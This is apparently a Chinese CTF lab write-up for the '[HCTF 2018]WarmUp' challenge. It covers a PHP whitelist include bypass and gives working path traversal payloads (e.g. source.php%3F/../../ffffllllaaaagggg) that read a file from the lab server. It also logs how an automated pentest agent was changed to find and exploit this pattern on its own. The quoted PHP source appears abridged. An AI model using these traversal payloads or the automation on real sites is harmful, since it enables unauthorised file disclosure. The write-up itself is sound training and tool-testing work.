# DASCTF / [HCTF 2018]WarmUp 源码泄露 include bypass 做题 WP

> 日期：2026-06-09  
> 平台：DASCTF practice / BUUCTF 公开练习  
> 题目：`[HCTF 2018]WarmUp`  
> 类型：Web / PHP source leak / whitelist include bypass / path traversal  
> 最终 flag：`DASCTF{98f25b58-3791-41b3-90c4-82024130af66}`  
> 本次目标：用真实靶场验证 FlagHunter 对源码线索、提示文件和文件包含绕过链的自动化能力。

---

## 1. 环境与入口

使用 OpenCLI Browser Bridge 复用本机浏览器登录态进入 DASCTF 练习页：

```text
https://ctf2.dasctf.com/dashboard/practice/b9bbb32f-f186-458f-b90b-12440c0f6aea?tab=challenges
```

启动 `[HCTF 2018]WarmUp` 后得到目标：

```text
http://05e8aeabefb3191f24da6738.http-ctf2.dasctf.com:80
```

约束：

- 不截图。
- 不导出大体积 HTML / network body。
- 只做少量 HTTP 侦察和源码线索验证，不做大规模扫描。

---

## 2. 初始页面观察

首页 body 很小，关键线索藏在 HTML 注释中：

```html
<!--source.php-->
```

这说明第一优先级不是目录扫描，而是直接访问源码提示：

```text
/source.php
```

---

## 3. 源码关键点

访问：

```text
http://05e8aeabefb3191f24da6738.http-ctf2.dasctf.com/source.php
```

页面高亮 PHP 源码，核心逻辑如下：

```php
class emmm {
    public static function checkFile(&$page) {
        $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
        $_page = mb_substr($page, 0, mb_strpos($page . '?', '?'));
        $_page = urldecode($page);
    }
}

if (!empty($_REQUEST['file']) && emmm::checkFile($_REQUEST['file'])) {
    include $_REQUEST['file'];
}
```

关键事实：

- 白名单只允许 `source.php` 和 `hint.php`。
- `checkFile()` 会用 `?` 前缀判断白名单。
- 通过检查后，实际 `include $_REQUEST['file']` 使用的是完整参数。
- 因此可以构造 `source.php?/../../...` 这种前缀合法、后缀穿越的 include payload。

---

## 4. 提示文件

访问：

```text
/hint.php
```

响应：

```text
flag not here, and flag in ffffllllaaaagggg
```

所以真实 flag 文件名为：

```text
ffffllllaaaagggg
```

---

## 5. 最终利用

最小有效 payload：

```text
/?file=source.php%3F/../../../../../ffffllllaaaagggg
```

等价变体也可成功：

```text
/?file=source.php%3F../../../../../ffffllllaaaagggg
/?file=hint.php%3F/../../../../../ffffllllaaaagggg
/?file=source.php%253F/../../../../../ffffllllaaaagggg
```

最终响应得到：

```text
DASCTF{98f25b58-3791-41b3-90c4-82024130af66}
```

---

## 6. FlagHunter 初始表现

修复前运行：

```powershell
.\.venv\Scripts\pentestagent run -t "http://05e8aeabefb3191f24da6738.http-ctf2.dasctf.com:80" --mode ctf --max-loops 6 "拿到flag。优先少量HTTP侦察、源码线索和文件读取，不要大规模扫描。"
```

结果：

```text
detected_type=web
未命中 flag；已按收敛规则停止并记录缺口
```

暴露出的项目不足：

1. `_phase_recon` 没有把 HTML 注释中的 `source.php` 提取进 `raw_links`。
2. `backup_source_leak` 候选过度依赖 href/action，漏掉裸露源码文件名。
3. 发现 WarmUp 风格源码后，缺少 `hint.php -> flag filename -> ?file=source.php?...` 的最小 include bypass 策略。
4. payload 生成时若把 `/` 全编码为 `%2F`，可读性和部分 PHP 解析兼容性不如保留路径分隔符。

---

## 7. 项目改造记录

文件：

```text
pentestagent/agents/pa_agent/ctf_dispatcher.py
tests/unit/agents/test_ctf_dispatcher.py
```

修复点：

- `_phase_recon` 合并 `_extract_embedded_links()` 从页面源码提取到的链接。
- `_extract_embedded_links()` 支持 HTML 注释中的 `source.php` / `hint.php` / `flag.txt` 等裸文件名。
- `backup_source_leak` 增加 `/source.php`、`/hint.php`、`.phps` 等源码候选。
- 新增 WarmUp include bypass 检测与利用：
  - `_looks_like_warmup_include_source()`
  - `_attempt_warmup_include_bypass()`
  - `_extract_warmup_flag_filenames()`
- include payload 使用 `quote(payload, safe="/")`，保留 `/` 作为路径分隔符。

新增回归：

```text
test_ctf_dispatcher_extracts_comment_source_links_for_warmup
test_ctf_dispatcher_extracts_warmup_flag_filename_hint
test_ctf_dispatcher_solves_warmup_comment_source_include_bypass
```

---

## 8. 验证记录

单测：

```powershell
.\.venv\Scripts\pytest tests\unit\agents\test_ctf_dispatcher.py -k "warmup or comment_source_links or warmup_flag_filename_hint"
```

结果：

```text
3 passed
```

扩大回归：

```powershell
.\.venv\Scripts\pytest tests\unit\agents\test_ctf_dispatcher.py -k "warmup or backup_source or file_read or generic_param_sqli or solves_auth_form_sqli"
```

结果：

```text
12 passed
```

完整 dispatcher 回归：

```powershell
.\.venv\Scripts\pytest tests\unit\agents\test_ctf_dispatcher.py
```

结果：

```text
140 passed
```

活靶端到端复测：

```powershell
.\.venv\Scripts\pentestagent run -t "http://05e8aeabefb3191f24da6738.http-ctf2.dasctf.com:80" --mode ctf --max-loops 6 "拿到flag。优先少量HTTP侦察、源码线索和文件读取，不要大规模扫描。"
```

结果：

```text
backup candidate: http://05e8aeabefb3191f24da6738.http-ctf2.dasctf.com/source.php
Flag verified: DASCTF{98f25b58-3791-41b3-90c4-82024130af66}
Duration: 0m 19s
```

---

## 9. 可复用经验

这道题对 FlagHunter 的长期价值不在某个固定 payload，而在三条通用规则：

1. CTF Web recon 必须把 HTML 注释里的源码文件名当作高价值 route 线索。
2. `source.php` / `hint.php` 这类裸文件名应进入 source-first 链，而不是等大规模扫描发现。
3. 发现 whitelist + `include $_REQUEST[...]` + `?` 截断判断时，应优先做小规模 include bypass，而不是退回泛化 recon。
